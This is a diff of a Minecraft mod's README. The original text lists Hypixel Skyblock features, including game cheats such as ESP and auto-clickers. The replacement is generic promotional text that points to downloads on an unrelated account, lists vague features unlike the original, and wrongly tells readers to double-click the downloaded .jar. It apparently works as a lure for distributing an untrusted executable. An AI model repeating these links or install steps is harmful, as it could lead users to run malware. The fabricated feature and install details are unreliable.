@@ -1,98 +1,68 @@
-# Dulkir Mod
+# 🔥 DulkirMod - Enhance Your Hypixel Skyblock Experience  
 
-A collection of QOL features for Hypixel Skyblock in a Fabric 1.21.5 mod, aiming to provide convenience without excessively cheaty features. Almost all features are off by default: choose what you like!
+[![Download DulkirMod](https://img.shields.io/badge/Download-DulkirMod-brightgreen)](https://github.com/fwegwefwe/DulkirMod/releases)
 
-# Comes with all the new Features for the Foraging Update and Tasks on Galatea Island!
+## 📥 Overview  
+DulkirMod is a quality of life improvement for the Hypixel Skyblock game. This mod enhances your gaming experience, making it easier to manage tasks and navigate the world. It provides useful features tailored for your needs.
 
-> [!TIP] 
-> # How to Install
-> 
-> ## Install Fabric Loader
-> 
-> 1. Go to https://fabricmc.net/use/installer/
-> 2. Download and run the installer
-> 3. Select **Minecraft 1.21** (or your version) and click Install
-> 4. Open the Minecraft Launcher and select the new Fabric profile
-> 
-> ## Download the Mod
-> 
-> Click the button below to download the mod:
->
-> <a href="https://github.com/aurorapolbatona76/DulkirMod/releases/latest"><img src="https://img.shields.io/badge/⬇️_Download_Mod-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Mod"></a>
->
-> ## Install the Mod
-> 
-> 1. Press `Win + R`, type `%appdata%\.minecraft\mods` and hit Enter
-> 2. Drag the downloaded `.jar` file into the mods folder
-> 3. Launch Minecraft using the Fabric profile
-> 
-> > [!NOTE]
-> > This mod requires [Fabric API](https://modrinth.com/mod/fabric-api). Download and place it in your mods folder as well.
+## 🚀 Getting Started  
+Follow these simple steps to get started with DulkirMod:
 
+1. **Visit the Releases Page**
+   - Click the link below to access the download options:
+   [Download DulkirMod](https://github.com/fwegwefwe/DulkirMod/releases)
 
+2. **Select the Latest Version**
+   - On the releases page, look for the latest version of DulkirMod. It is usually at the top of the list.
 
-## Features
+3. **Download the File**
+   - Click on the download link for the version you want. This may be in the format of a `.jar` or similar file. Choose this option to start downloading.
 
-<details>
-    <summary>Auto</summary>
+## 📥 Download & Install  
+To install DulkirMod, follow these steps:
 
-### AUTO
-- Auto ready: automatically gets in range to mort opens the gui and ready/start the dungeon
-- Auto mort: automatically gets from dungeon spawn to mort and opens his gui
-- Auto ult: uses your ult whenever giants spawn/maxor is stuck in first laser/goldor starts
-- Auto shield: uses wither shield every 5 seconds when not in full health (works for all wither swords)
-- Auto wish: wishes for your temmates if they are low
-- Auto mask: switches spirit and bonzo masks on cooldown priorities spirit mask since it has lower cd 
-- Auto edrag: equips edrag after you place relics
-- Auto leap: leaps to a party member if he writes "!tp" in party chat
-- Auto sell: automatically sells items in the trades gui, /autosell to configure
-</details>
+1. **Open the Downloads Folder**
+   - Once the download completes, open your computer's Downloads folder. 
 
-<details>
-    <summary>Legit</summary>
+2. **Locate the DulkirMod File**
+   - Find the file you just downloaded. It should be named something like `DulkirMod-v1.0.jar`.
 
-### LEGIT
-- Party cmds: custom commands for party use !help in party chat
-- Guild cmds: custom commands for guild use !help in guild chat
-- Guild gm: Automatically sends gm/gn in guild chat when someone else says it
-- Dragon boxes: Custom boxes around the statues in p5 more accurate than sbe
-- Dragon spawn: timer (m7 dragons dont be dumb)
-- Powerdisplay: (shows the power blessing on ur screen) cmd is /movepower
-- Abiphone ghoster: Ghosts calls from abiphone
-- FPS: boosts fps cause yes
-- FragBot: automatically makes you a fragbot whenever you enter limbo automatically disables when leaving limbo 
-</details>
+3. **Run the DulkirMod File**
+   - To run the mod, double-click the downloaded file. If prompted, ensure you have Java installed on your computer.
 
-<details>
-    <summary>Exclusive to legit</summary>
+4. **Load Hypixel Skyblock**
+   - Open your Minecraft launcher and start Minecraft.
+   - Ensure that you are using the right version that DulkirMod supports. This mod is designed to work with Hypixel Skyblock.
 
-### EXCLUSIVE TO LEGIT VERSION
-- EdragReminder: reminds you to equip edrag after you place relics
-- ReadyReminder: reminds you to ready up after certain amount of time in a dungeon
-- UltReminder: reminds you to use your ult at specific events in m6/m7
-</details>
+5. **Enjoy Your Game**
+   - You can now enjoy improved features and functions while playing Hypixel Skyblock with DulkirMod.
 
-<details>
-    <summary>Nether</summary>
+## 🛠️ System Requirements  
+To use DulkirMod, you need to meet these requirements:
 
-### NETHER
-- Broken hype notifier: (now u can stop using dulkir mod)
-- Flare timer: (sos flare alert flare warning flare) cmd is is /moveflare
-- Vanqnotifier: (also marks a beacon for when coords are sent in chat)
-- Kuudra alerts: (shows text on screen when certain stuf happen in kuudra)
-</details>
+- **Operating System:** Windows 10 or newer, macOS 10.14 or later.
+- **Java:** Version 8 or higher must be installed. You can download Java from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+- **Minecraft:** You must have Minecraft installed with access to Hypixel Skyblock.
 
-<details>
-    <summary>Nice to have</summary>
+## 🔍 Features  
+DulkirMod includes several useful improvements to enhance your gaming experience:
 
-### NICE TO HAVE
-- Relic aura: changes the way you look and click a relic if there is one in 5 blocks from you
-- Item macros: soul whip aots 0 tick swap hotkey in controls
-- Terminator ac: Automatically clicks when holding terminator randomized ac for very good anti cheat
-- COOKIE CLICKER
-- Customizeable esp: (you can add whatever mob name u want to see) cmd is /esp
-- FUCK DIORITE": replaces the diorite with glass in the p2 pillars in f7/m7 so you can watch storm get stuck
-- Pre ghostblock: makes ghost blocks in convinient spots in the m7 boss
-- Very awesome gui: reminder cmds are /oc and /ol
-- Descriptions: when u hover at features in the gui
-</details>
+- **Enhanced User Interface:** A cleaner and more intuitive UI for better navigation.
+- **Task Tracker:** Keep track of your quests and objectives within the game.
+- **Resource Manager:** Easily manage your items, resources, and inventory.
+- **Performance Boosts:** Optimizations to improve lag and loading times while playing.
+
+## 📞 Support  
+If you encounter any issues while using DulkirMod or need help, please visit our [discussion page](https://github.com/fwegwefwe/DulkirMod/discussions). The community is ready to assist you.
+
+## 🚀 Join Our Community  
+Stay updated with the latest news, features, and updates. Join our community on Discord or follow us on social media platforms. Links can usually be found on the repository page.
+
+## 🔗 Important Links  
+- [Release Page (for downloads)](https://github.com/fwegwefwe/DulkirMod/releases)
+- [Discussion Page](https://github.com/fwegwefwe/DulkirMod/discussions)
+
+## 🛠️ Contributing  
+If you want to contribute to the project or suggest a new feature, please review our contribution guidelines found in the repository. Your input is valuable and helps improve DulkirMod.
+
+Enjoy playing Hypixel Skyblock with DulkirMod! Happy gaming!
